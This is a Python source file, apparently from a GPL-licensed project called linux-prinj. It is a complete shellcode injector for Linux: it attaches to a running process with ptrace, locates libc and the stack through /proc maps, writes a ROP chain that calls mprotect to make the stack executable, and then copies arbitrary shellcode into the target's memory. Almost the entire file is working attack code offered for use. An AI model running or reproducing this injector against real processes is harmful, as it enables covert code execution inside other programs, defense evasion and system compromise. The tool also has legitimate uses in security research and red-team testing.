#!/usr/bin/env python3
#
# This file is part of the linux-prinj project.
# https://gitlab.com/pgregoire/linux-prinj/
#
# Copyright 2022 Philippe Grégoire <git@pgregoire.xyz>
#
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

import ctypes

from pwn import *


context.log_level = 'critical'


# -------------------------------------------------------------------- #
# ptrace

libc = None
def loadlibc(path):
    global libc

    libc = ctypes.CDLL(path)

    # ptrace's signature
    libc.ptrace.argtypes = [
        ctypes.c_uint64,
        ctypes.c_uint64,
        ctypes.c_void_p,
        ctypes.c_void_p,
    ]
    libc.ptrace.restype = ctypes.c_uint64

    # process_vm_writev's signature
    libc.process_vm_writev.argtypes = [
        ctypes.c_uint32,
        ctypes.c_void_p,
        ctypes.c_uint64,
        ctypes.c_void_p,
        ctypes.c_uint64,
        ctypes.c_uint64,
    ]
    libc.process_vm_writev.restype = ctypes.c_int64

class iovec(ctypes.Structure):
    _fields_ = [
        ("iov_base", ctypes.c_void_p),
        ("iov_len", ctypes.c_ulong)
    ]


class UserRegsStruct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]


def ptrace_attach(pid):
    return libc.ptrace(16, pid, 0, 0)


def ptrace_detach(pid):
    return libc.ptrace(17, pid, 0, 0)


def ptrace_getregs(pid):
    r = UserRegsStruct()
    e = libc.ptrace(12, pid, 0, ctypes.byref(r))
    assert(0 == e)
    return r

def ptrace_singlestep(pid):
    libc.ptrace(9, pid, 0, 0)


# helpers
def attach(pid):
    ptrace_attach(pid)
    os.waitpid(pid, 0)


def singlestep(pid):
    ptrace_singlestep(pid)
    os.waitpid(pid, 0)

# -------------------------------------------------------------------- #
# /proc/

def getmaps(pid):
    with open('/proc/{}/maps'.format(pid)) as fp:
        dat = fp.read()

    r = []
    for ln in [e for e in dat.split('\n') if e]:
        s = [e for e in ln.split(' ') if e]
        r += [{
          'addr': s[0],
          'from': int(s[0].split('-')[0], 16),
          'to': int(s[0].split('-')[1], 16),
          'perms': s[1],
          'offset': int(s[2], 16),
          'dev': s[3],
          'devmaj': int(s[3].split(':')[0], 16),
          'devmin': int(s[3].split(':')[1], 16),
          'inode': int(s[4]),
          'path': None if 5 == len(s) else s[5],
        }]

    return r

# -------------------------------------------------------------------- #
# rop chain

def buildchain(libmap, stkmap, regs):
    rop = ROP(libmap['path'])

    libc_base = libmap['from']
    stkbase = stkmap['from']
    stklen = stkmap['to'] - stkmap['from']

    entry = b''
    ## mprotect(stkbase, stklen, 7)
    entry += p64(libc_base + rop.rax.address)
    entry += p64(10) # sys_mprotect
    entry += p64(libc_base + rop.rdi.address)
    entry += p64(stkbase)
    entry += p64(libc_base + rop.rsi.address)
    entry += p64(stklen)
    entry += p64(libc_base + rop.rdx.address)
    entry += p64(7) # PROT_READ | PROT_WRITE | PROT_EXEC
    # rop.syscall is not necessarily followed by ret
    entry += p64(libc_base + rop.find_gadget(['syscall', 'ret']).address)
    entry += p64(stkbase)

    return entry


def findlibc(maps):
    return [m for m in maps if m['path'] and '/libc' in m['path']][0]


def findstack(maps):
    return [m for m in maps if '[stack]' == m['path']][0]

# -------------------------------------------------------------------- #

def wrmem(pid, addr, buf):
    sz = len(buf)
    bf = (ctypes.c_char*sz).from_buffer(bytearray(buf))
    lv = iovec(ctypes.cast(ctypes.byref(bf), ctypes.c_void_p), sz)
    rv = iovec(ctypes.c_void_p(addr), sz)
    libc.process_vm_writev(pid, ctypes.byref(lv), 1, ctypes.byref(rv), 1, 0)


if len(sys.argv) not in [2, 3]:
    print('inject <shellcode.bin> [pid]', file=sys.stderr)
    exit(1)

with open(sys.argv[1], 'rb') as fp:
    code = fp.read()

pid = int(sys.argv[2])

maps = getmaps(pid)
libc_map = findlibc(maps)
loadlibc(libc_map['path'])
stk_map = findstack(maps)

try:
    attach(pid)
    regs = ptrace_getregs(pid)

    rop = buildchain(libc_map, stk_map, regs)

    wrmem(pid, regs.rsp, rop)
    wrmem(pid, stk_map['from'], code)
finally:
    ptrace_detach(pid)
